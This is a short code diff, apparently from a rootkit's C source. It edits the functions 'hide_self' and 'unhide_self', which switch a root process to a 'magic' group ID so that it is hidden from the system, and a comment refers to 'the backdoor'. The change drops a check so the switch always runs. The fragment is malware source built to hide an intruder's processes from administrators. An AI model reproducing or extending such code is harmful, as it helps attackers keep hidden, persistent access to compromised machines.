@@ -55,7 +55,7 @@ void hide_self(void){
 #endif
 
     gid_t magicgid = readgid();
-    if(notuser(0) || getgid() == magicgid) return;
+    if(notuser(0)) return;
     _setgid(magicgid);
 }
 
@@ -64,7 +64,7 @@ void unhide_self(void){
     return;
 #endif
 
-    if(notuser(0) || getgid() == 0) return;
+    if(notuser(0)) return;
     _setgid(0);
 }
 #define PATH_ERR   -1  /* error codes for when the backdoor */
